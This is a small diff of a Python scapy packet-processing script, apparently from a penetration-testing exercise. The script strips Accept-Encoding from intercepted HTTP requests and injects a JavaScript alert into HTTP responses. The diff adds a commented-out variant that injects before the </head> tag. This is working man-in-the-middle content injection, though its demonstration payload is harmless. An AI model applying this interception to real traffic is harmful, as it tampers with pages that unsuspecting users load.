@@ -27,7 +27,6 @@ def process_packet(packet):
             # print("\n[+] Packet has layer TCP")
             if scapy_packet[TCP].dport == 80:
                 print("[+] This is a HTTP Request:  ")
-                # 
                 # Find "Accept-Encoding" in payload, replace with ""
                 modified_load = re.sub(
                     "Accept-Encoding:.*?\\r\\n",
@@ -44,6 +43,8 @@ def process_packet(packet):
             elif scapy_packet[TCP].sport == 80:
                 # invoke python method replace to replace a string with another string
                 modified_load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Test!'); </script></body>")
+                # This works with http://www.pentest-standard.org/ and allows page to load
+                # modified_load = scapy_packet[Raw].load.replace("</head>", "<script>alert('Test!'); </script></head>")
                 new_packet = set_load(scapy_packet, modified_load)
                 packet.set_payload(str(new_packet))
     packet.accept()
